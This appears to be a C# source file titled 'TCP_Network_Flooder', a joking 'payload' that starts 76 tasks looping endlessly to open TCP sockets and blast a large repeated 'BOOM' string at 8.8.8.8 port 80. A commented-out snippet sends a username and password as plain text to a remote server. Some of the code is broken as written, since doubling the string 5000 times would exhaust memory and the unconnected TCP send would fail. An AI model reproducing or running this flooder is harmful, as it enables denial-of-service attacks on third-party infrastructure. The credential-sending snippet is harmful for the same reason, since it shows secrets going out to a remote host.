
/* (c) All Rights Reserved, Dashies Software Inc. */

/* Why not? x) Dash Payloadddsss c: */

using System;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

/*

Socket soc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
System.Net.IPAddress ipAdd = System.Net.IPAddress.Parse(server);
System.Net.IPEndPoint remoteEP = new IPEndPoint(ipAdd, 3456);
soc.Connect(remoteEP);
For connecting to it. To send something:

//Start sending stuf..
byte[] byData = System.Text.Encoding.ASCII.GetBytes("un:" + username + ";pw:" + password);
soc.Send(byData); 
     
*/

namespace TCP_Network_Flooder {
    class Program {
        private static String GenerateMass() {
            String Result = "BOOM";

            for(int index = 0; index <= 5000; index += 1) Result += Result;

            return Result;
        }

        private static readonly Byte[] Data = Encoding.ASCII.GetBytes(GenerateMass());

        private static void Sender() {
            while(true) {
                for(int index = 0; index <= 1000000; index += 1) {
                    Socket LongSocks = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    IPAddress InternetProtocolAddr = IPAddress.Parse("8.8.8.8");
                    IPEndPoint RemoteEntrance = new IPEndPoint(InternetProtocolAddr, 80);
                    LongSocks.SendTo(Data, RemoteEntrance);
                    LongSocks.Close();
                }
            }
        }

        static void Main(string[] args) {
            for(int index = 0; index <= 75; index += 1) {
                Task Gimme = Task.Run((Action)Sender);
            }

            Console.WriteLine("+ Sending Dattaaaaaa,wraaaarrrrrrwwwww");
            
            while (true) { }
        }
    }
}
